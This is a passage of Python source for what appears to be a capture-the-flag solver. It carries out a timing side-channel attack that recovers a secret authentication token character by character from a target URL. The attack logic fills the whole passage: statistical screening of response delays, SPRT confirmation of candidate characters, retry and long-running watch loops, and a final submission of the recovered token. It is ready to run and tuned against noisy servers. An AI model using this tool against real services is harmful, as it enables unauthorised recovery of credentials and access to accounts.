            guard_accepts = artifact_guard_accepts(
                phase_one_z, reprobes, baseline, sigma
            )
            if not guard_accepts and char in promoted_leaders:
                print(
                    f"  [screen] dual-pass leader retained after guard for {char!r}",
                    flush=True,
                )
                guard_accepts = True
            if not guard_accepts:
                print(
                    f"  [artifact] excluded '{char}': phase-1 z={phase_one_z:.2f}; "
                    f"re-probe z={reprobe_z[0]:.2f},{reprobe_z[1]:.2f}",
                    flush=True,
                )
                continue
            guard_samples[char] = [] if char in promoted_leaders else reprobes
            eligible.append((score, char))
            if verbose:
                print(
                    f"  artifact guard '{char}': "
                    f"{reprobe_z[0]:.2f}z/{reprobe_z[1]:.2f}z (2/2 elevated)",
                    flush=True,
                )

        if not eligible:
            best_z = max(z_score(score, baseline, sigma) for score, _ in scores)
            raise NoWinner(
                "all phase-1 outliers were rejected as artifacts",
                best_z=best_z,
                baseline=baseline,
            )
        return eligible, guard_samples, guard_probes

    def phase_two(
        prefix: str,
        scores: list[tuple[float, str]],
        baseline: float,
        sigma: float,
        guard_samples: dict[str, list[float]],
        historical_primes: list[str],
        passes: list[ScreeningPass],
        preferred_char: str | None = None,
        initial_samples: dict[str, list[float]] | None = None,
    ) -> tuple[str, float, float, int]:
        """SPRT-check the top two leaders with alternating fresh probes."""
        ranked = sorted(
            scores,
            key=lambda item: z_score(item[0], baseline, sigma),
            reverse=True,
        )
        leaders = [char for _, char in ranked[: min(2, len(ranked))]]
        for char in historical_primes:
            if char in {candidate_char for _, candidate_char in scores} and char not in leaders:
                leaders.append(char)
        leaders = leaders[:4]
        if preferred_char is not None and preferred_char in {
            char for _, char in scores
        }:
            leaders = [
                preferred_char,
                *[char for _, char in ranked if char != preferred_char][:1],
            ]
        values = {
            char: list(
                (initial_samples or {}).get(
                    char,
                    [next(score for score, candidate_char in scores if candidate_char == char)],
                )
            ) + (
                []
                if char in historical_primes
                else guard_samples.get(char, [])
            )
            for char in leaders
        }

        winner_band = state.get("winner_delta_band")
        band_values: list[float] = []
        if isinstance(winner_band, list):
            for value in winner_band:
                try:
                    number = float(value)
                except (TypeError, ValueError):
                    continue
                if math.isfinite(number) and number > 0:
                    band_values.append(number)
        delta = statistics.median(band_values) if band_values else 70.0
        sprt_sigma = max(float(sigma), 1e-6)
        if len(leaders) == 1 and leaders[0] in historical_primes:
            historical_char = leaders[0]
            historical_score = statistics.median(values[historical_char])
            return (
                historical_char,
                historical_score,
                z_score(historical_score, baseline, sigma),
                0,
            )
        threshold_win = math.log(0.98 / 0.02)
        threshold_lose = math.log(0.02 / 0.98)
        llr = {char: 0.0 for char in leaders}
        for char in historical_primes:
            if char not in values:
                continue
            # A prime's current screen is prior evidence.  Let it offset one
            # flat fresh re-probe; this is the promised history-over-guard
            # behavior without weakening ordinary SPRT candidates.
            for value in values[char]:
                x = value - baseline
                log_signal = -0.5 * ((x - delta) / sprt_sigma) ** 2
                log_null = -0.5 * (x / sprt_sigma) ** 2
                llr[char] += log_signal - log_null
        eliminated: set[str] = set()
        fresh_samples = {char: 0 for char in leaders}
        max_samples = 12
        if verbose:
            print(
                f"  => SPRT: top-{len(leaders)} alternating, D={delta:.2f} ms, "
                f"sigma={sprt_sigma:.2f} ms, cap={max_samples}/candidate",
                flush=True,
            )

        for _round_number in range(max_samples):
            for char in leaders:
                if char in eliminated or fresh_samples[char] >= max_samples:
                    continue
                raw_score, timestamp = probe_once_timed(client, prefix, char)
                score = live_adjusted_score(raw_score, timestamp, passes)
                values[char].append(score)
                fresh_samples[char] += 1
                x = score - baseline
                log_signal = -0.5 * ((x - delta) / sprt_sigma) ** 2
                log_null = -0.5 * (x / sprt_sigma) ** 2
                llr[char] += log_signal - log_null
                print(
                    f"[sprt] cand={char!r} llr={llr[char]:+.2f} "
                    f"n={fresh_samples[char]}",
                    flush=True,
                )
                if llr[char] <= threshold_lose:
                    eliminated.add(char)
                elif llr[char] >= threshold_win:
                    chosen_score = statistics.median(values[char])
                    return (
                        char,
                        chosen_score,
                        z_score(chosen_score, baseline, sigma),
                        sum(fresh_samples.values()),
                    )
            if len(eliminated) == len(leaders):
                raise NoWinner(
                    "both SPRT finalists were eliminated",
                    best_z=max(
                        z_score(statistics.median(values[char]), baseline, sigma)
                        for char in leaders
                    ),
                    baseline=baseline,
                )

        remaining = [char for char in leaders if char not in eliminated]
        if not remaining:
            raise NoWinner(
                "both SPRT finalists were eliminated",
                best_z=max(
                    z_score(statistics.median(values[char]), baseline, sigma)
                    for char in leaders
                ),
                baseline=baseline,
            )
        best_char = max(remaining, key=lambda char: llr[char])
        best_score = statistics.median(values[best_char])
        best_z = z_score(best_score, baseline, sigma)
        if verbose:
            print(
                f"  => SPRT finalists: "
                f"{[(char, round(llr[char], 2)) for char in leaders]}",
                flush=True,
            )
        return (
            best_char,
            best_score,
            best_z,
            sum(fresh_samples.values()),
        )

    def evaluate_screen(
        prefix: str,
        scores: list[tuple[float, str]],
        baseline: float,
        sigma: float,
        historical_primes: list[str],
        passes: list[ScreeningPass],
        initial_samples: dict[str, list[float]],
    ) -> tuple[str, float, float, float, int, bool]:
        """Guard phase-1 outliers, then run the alternating SPRT check."""
        eligible, guard_samples, guard_probes = artifact_guard(
            prefix,
            scores,
            baseline,
            sigma,
            historical_primes,
            passes,
            {char for _, char in scores},
        )
        chosen_char, chosen_ms, chosen_z, extra_probes = phase_two(
            prefix,
            eligible,
            baseline,
            sigma,
            guard_samples,
            historical_primes,
            passes,
            initial_samples=initial_samples,
        )
        return (
            chosen_char,
            chosen_ms,
            chosen_z,
            chosen_ms - baseline,
            len(scores) + guard_probes + extra_probes,
            chosen_char in historical_primes,
        )

    def deep_sample(
        prefix: str,
        scores: list[tuple[float, str]],
        baseline: float,
        sigma: float,
        historical_primes: list[str],
        passes: list[ScreeningPass],
    ) -> tuple[str, list[float], int] | None:
        """Sample phase-1 raw-score suspects before declaring no signal."""
        suspects = [
            char
            for _, char in sorted(scores, key=lambda item: item[0], reverse=True)[
                : min(3, len(scores))
            ]
        ]
        for char in historical_primes:
            if char in {candidate_char for _, candidate_char in scores} and char not in suspects:
                suspects.append(char)
        suspects = suspects[:4]
        samples = {char: [] for char in suspects}
        deep_number = 0
        deep_total = len(suspects) * DEEP_SAMPLE_ROUNDS
        for _ in range(DEEP_SAMPLE_ROUNDS):
            for char in suspects:
                deep_number += 1
                print(
                    f"[deep] {deep_number}/{deep_total} cand={char!r}",
                    flush=True,
                )
                raw_score, timestamp = probe_once_timed(client, prefix, char)
                samples[char].append(
                    live_adjusted_score(raw_score, timestamp, passes)
                )

        result = deep_rate_decision(
            samples,
            baseline,
            sigma,
            rounds=DEEP_SAMPLE_ROUNDS,
        )
        if result is None:
            return None
        winner, rate, elevated_median, threshold = result
        print(
            f"[deep] c={winner!r} rate={rate:.2f} "
            f"elevated-med={elevated_median - baseline:+.0f}ms "
            f"threshold={threshold - baseline:.0f}ms.",
            flush=True,
        )
        return winner, samples[winner], deep_total

    def confirm_deep_sample(
        prefix: str,
        scores: list[tuple[float, str]],
        baseline: float,
        sigma: float,
        historical_primes: list[str],
        passes: list[ScreeningPass],
    ) -> tuple[str, float, float, float, int, bool] | None:
        deep_result = deep_sample(
            prefix, scores, baseline, sigma, historical_primes, passes
        )
        if deep_result is None:
            return None
        preferred_char, preferred_samples, deep_probes = deep_result
        deep_decision = deep_rate_decision(
            {preferred_char: preferred_samples},
            baseline,
            sigma,
            rounds=DEEP_SAMPLE_ROUNDS,
        )
        if deep_decision is None:
            return None
        _winner, _rate, elevated_median, _threshold = deep_decision
        return (
            preferred_char,
            elevated_median,
            z_score(elevated_median, baseline, sigma),
            elevated_median - baseline,
            deep_probes,
            False,
        )

    def choose_position(
        prefix: str,
    ) -> tuple[str, float, float, float, float, float, int]:
        """Run dual-pass screening, then one fresh dual-pass retry if needed."""

        def attempt(label: str) -> tuple[
            tuple[str, float, float, float, int, bool] | None,
            list[ScreeningPass],
            list[tuple[float, str]],
            list[tuple[float, str]],
            dict[str, list[float]],
            float,
            float,
            list[str],
        ]:
            passes = screen_position(prefix, label)
            historical = historical_prime_suspects(len(prefix) + 1)
            all_scores, leader_scores, initial_samples, baseline, sigma = (
                combine_passes(passes, historical)
            )
            probes = sum(screen.probes for screen in passes)
            if not leader_scores:
                return None, passes, all_scores, leader_scores, initial_samples, baseline, sigma, historical
            result = evaluate_screen(
                prefix,
                leader_scores,
                baseline,
                sigma,
                historical,
                passes,
                initial_samples,
            )
            return result, passes, all_scores, leader_scores, initial_samples, baseline, sigma, historical

        first_error: NoWinner | None = None
        try:
            (
                result,
                passes,
                all_scores,
                leader_scores,
                initial_samples,
                baseline,
                sigma,
                historical,
            ) = attempt("screening")
        except NoWinner as exc:
            first_error = exc
            result = None
            passes = []
            all_scores = leader_scores = []
            initial_samples = {}
            baseline = sigma = float("nan")
            historical = []
        if result is not None:
            chosen_char, chosen_ms, chosen_z, chosen_delta, probes, quick = result
            if quick or chosen_z >= 5.0:
                return chosen_char, chosen_ms, chosen_z, chosen_delta, baseline, sigma, probes
            deep_result = confirm_deep_sample(
                prefix, leader_scores, baseline, sigma, historical, passes
            )
            if deep_result is not None:
                deep_char, deep_ms, deep_z, deep_delta, deep_probes, _ = deep_result
                return deep_char, deep_ms, deep_z, deep_delta, baseline, sigma, probes + deep_probes

        best_text = "nan" if first_error is None or first_error.best_z is None else f"{first_error.best_z:.2f}"
        print(
            f"  [!] No relative winner: best={best_text}z; "
            "re-running the full screen once...",
            flush=True,
        )
        try:
            (
                retry_result,
                retry_passes,
                retry_all_scores,
                retry_leader_scores,
                retry_initial_samples,
                retry_baseline,
                retry_sigma,
                retry_historical,
            ) = attempt("screening retry")
        except NoWinner as exc:
            raise NoWinner(
                f"position {len(prefix) + 1}: {exc}",
                best_z=exc.best_z,
                baseline=exc.baseline,
            ) from exc
        if retry_result is None:
            raise NoWinner(
                f"position {len(prefix) + 1}: no candidate passed dual screening",
                baseline=retry_baseline,
            )
        (
            retry_char,
            retry_ms,
            retry_z,
            retry_delta,
            retry_probes,
            retry_quick,
        ) = retry_result
        if not retry_quick and retry_z < 5.0:
            retry_deep_result = confirm_deep_sample(
                prefix,
                retry_leader_scores,
                retry_baseline,
                retry_sigma,
                retry_historical,
                retry_passes,
            )
            if retry_deep_result is not None:
                deep_char, deep_ms, deep_z, deep_delta, deep_probes, _ = retry_deep_result
                return (
                    deep_char,
                    deep_ms,
                    deep_z,
                    deep_delta,
                    retry_baseline,
                    retry_sigma,
                    retry_probes + deep_probes,
                )
            raise NoWinner(
                f"position {len(prefix) + 1}: best final z={retry_z:.2f} after retry",
                best_z=retry_z,
                baseline=retry_baseline,
            )
        return (
            retry_char,
            retry_ms,
            retry_z,
            retry_delta,
            retry_baseline,
            retry_sigma,
            retry_probes,
        )

    def choose_position_with_watch(
        prefix: str,
    ) -> tuple[str, float, float, float, float, float, int]:
        """Keep the same position alive during intermittent no-signal periods."""
        watch_deadline: float | None = None
        while True:
            try:
                return choose_position(prefix)
            except NoWinner as exc:
                if not watch:
                    raise
                if watch_deadline is None:
                    watch_deadline = time.monotonic() + watch_hours * 3600.0
                if time.monotonic() >= watch_deadline:
                    raise WatchExpired(
                        f"watch window expired at position {len(prefix) + 1}"
                    ) from exc
                best_z = float("nan") if exc.best_z is None else exc.best_z
                baseline = float("nan") if exc.baseline is None else exc.baseline
                print(
                    f"[watch {time.strftime('%H:%M')}] no signal "
                    f"best_z={best_z:.2f} baseline={baseline:.2f}ms",
                    flush=True,
                )
                time.sleep(300)
                if time.monotonic() >= watch_deadline:
                    raise WatchExpired(
                        f"watch window expired at position {len(prefix) + 1}"
                    ) from exc

    def rescreen_last_position() -> None:
        expected = recovered[-1]
        prefix = recovered[:-1]
        print(
            f"\n!!! SELF-HEALING CHECK: re-screening position {len(recovered)} "
            f"(expecting '{expected}') !!!",
            flush=True,
        )
        passes = screen_position(prefix, "self-heal")
        samples: dict[str, list[float]] = {char: [] for char in charset}
        for screening in passes:
            for score, char in screening.scores:
                samples.setdefault(char, []).append(score)
        scores = [
            (statistics.median(values), char)
            for char, values in samples.items()
            if values
        ]
        baseline, sigma = batch_statistics(scores)
        expected_score = next(score for score, char in scores if char == expected)
        expected_z = z_score(expected_score, baseline, sigma)
        if expected_z < 5.0:
            raise SelfHealingFailure(
                f"position {len(recovered)} expected '{expected}' measured "
                f"{expected_z:.2f}z relative to baseline {baseline:.2f} ms "
                f"(sigma {sigma:.2f} ms)"
            )
        state["baseline_ms"] = round(baseline, 2)
        state["sigma_ms"] = round(sigma, 2)
        evidence = state.get("evidence")
        if isinstance(evidence, dict):
            evidence.pop(str(len(recovered)), None)
        print(
            f"  [self-heal] PASS: '{expected}' z={expected_z:.2f}, "
            f"delta={expected_score - baseline:.2f} ms",
            flush=True,
        )

    while len(recovered) < limit:
        if (
            rescreen_every > 0
            and len(recovered) > 0
            and len(recovered) % rescreen_every == 0
            and len(recovered) != accepted_since_check
        ):
            try:
                rescreen_last_position()
            except TokenFound as exc:
                return record_success(exc)
            accepted_since_check = len(recovered)
            persist()

        position = len(recovered)
        started = time.monotonic()

        try:
            (
                chosen_char,
                chosen_score,
                chosen_z,
                chosen_delta,
                baseline,
                sigma,
                probes_used,
            ) = choose_position_with_watch(recovered)

        except TokenFound as exc:
            return record_success(exc)

        record_pick = getattr(client, "record_pick", None)
        if callable(record_pick):
            record_pick(chosen_delta, chosen_z)
        recovered += chosen_char
        state["recovered"] = recovered
        evidence = state.get("evidence")
        if isinstance(evidence, dict):
            # The position is complete; retain only evidence for the next
            # incomplete prefix so stale primes cannot leak across positions.
            evidence.pop(str(position + 1), None)
        # Keep the persisted winner band relative to its own screening batch;
        # raw timings are not comparable while server load is drifting.
        if not isinstance(state.get("winner_delta_band"), list):
            state["winner_delta_band"] = []
        state["winner_delta_band"].append(round(chosen_delta, 2))
        state["baseline_ms"] = round(baseline, 2)
        state["sigma_ms"] = round(sigma, 2)
        upsert_position(
            state,
            {
                "position": position + 1,
                "char": chosen_char,
                "median_ms": round(chosen_score, 2),
                "z": round(chosen_z, 2),
                "delta_ms": round(chosen_delta, 2),
                "probes": probes_used,
                "baseline_ms": round(baseline, 2),
                "sigma_ms": round(sigma, 2),
            },
        )
        persist()
        elapsed = time.monotonic() - started
        print(
            f"[OK] pos={position + 1}/{TOKEN_LENGTH} char='{chosen_char}' "
            f"z={chosen_z:.2f} delta={chosen_delta:+.2f}ms "
            f"probes={probes_used} wall={elapsed:.1f}s"
        )

    if len(recovered) == TOKEN_LENGTH:
        print(f"\n[*] Testing full recovered token: {recovered}")
        elapsed, response = client.send_auth(recovered)
        print(f"[*] Final Auth: HTTP {response.status_code} ({elapsed:.2f} ms): {response.text}")
        if response.status_code == 200:
            state["recovered"] = recovered
            state["response_text"] = response.text
            persist()
            print(f"\n[FLAG?] Server accepted: {recovered}\n{response.text}")

    return recovered


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("url", help="Target instance base URL")
    parser.add_argument("--state", type=Path, default=DEFAULT_STATE)
    parser.add_argument(
        "--delay",
        type=float,
        default=None,
        help="Starting cadence in seconds (clamped to 3-15; state.json wins if omitted)",
    )
    parser.add_argument("--min-delay", type=float, default=CADENCE_MIN)
    parser.add_argument("--max-delay", type=float, default=CADENCE_MAX)
    parser.add_argument("--max-retries", type=int, default=12)
    parser.add_argument(
        "--backoff",
        type=float,
        default=0.8,
        help="Deprecated compatibility option; connection retry backoff is fixed at 1-3s",
    )
    parser.add_argument("--timeout", type=float, default=15.0)
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Print every candidate timing and verification detail",
    )
    parser.add_argument("--positions", type=int, default=TOKEN_LENGTH)
    parser.add_argument(
        "--verify-samples",
        type=int,
        default=4,
        help="Deprecated SPRT compatibility option; verification cap is 12 per candidate",
    )
    parser.add_argument(
        "--top-m",
        type=int,
        default=4,
        help="Number of Phase-1 leaders to verify (default: 4)",
    )
    parser.add_argument(
        "--accept-margin",
        type=float,
        default=12.0,
        help="Deprecated compatibility option; acceptance uses live z-scores",
    )
    parser.add_argument("--charset", default=CHARSET)
    parser.add_argument(
        "--rescreen-every",
        type=int,
        default=6,
        help="Re-screen the last accepted position every K positions (default 6; 0 disables)",
    )
    parser.add_argument(
        "--watch",
        action="store_true",
        help="Keep watching intermittent no-signal positions instead of exiting 5",
    )
    parser.add_argument(
        "--watch-hours",
        type=float,
        default=12.0,
        help="Maximum no-signal watch window in hours (default: 12)",
    )
    args = parser.parse_args()
    if args.positions < 0:
        parser.error("--positions cannot be negative")
    if args.top_m < 1:
        parser.error("--top-m must be at least 1")
    if args.verify_samples < 1:
        parser.error("--verify-samples must be positive")
    if args.watch_hours <= 0:
        parser.error("--watch-hours must be positive")

    start_delay = args.delay if args.delay is not None else 0.5
    if args.delay is None and args.state.exists():
        try:
            saved_cadence = json.loads(args.state.read_text()).get("cadence")
            if isinstance(saved_cadence, (int, float)):
                start_delay = min(
                    args.max_delay,
                    max(args.min_delay, float(saved_cadence)),
                )
        except (OSError, json.JSONDecodeError):
            pass

    config = ClientConfig(
        delay=start_delay,
        min_delay=args.min_delay,
        max_delay=args.max_delay,
        max_retries=args.max_retries,
        backoff=args.backoff,
        timeout=args.timeout,
    )
    try:
        recover(
            args.url,
            config=config,
            state_path=args.state,
            positions=args.positions,
            verify_samples=args.verify_samples,
            accept_margin=args.accept_margin,
            charset=args.charset,
            rescreen_every=args.rescreen_every,
            top_m=args.top_m,
            verbose=args.verbose,
            watch=args.watch,
            watch_hours=args.watch_hours,
        )
    except InstanceOffline as exc:
        print(f"\n[!] INSTANCE OFFLINE: {exc}")
        sys.exit(3)
    except SelfHealingFailure as exc:
        print(f"\n!!! SELF-HEALING STOP: {exc} !!!")
        sys.exit(4)
    except NoWinner as exc:
        print(f"\n[!] NO WINNER: {exc}")
        sys.exit(5)
    except WatchExpired as exc:
        print(f"\n[!] WATCH EXPIRED: {exc}")
        sys.exit(6)


if __name__ == "__main__":
    main()
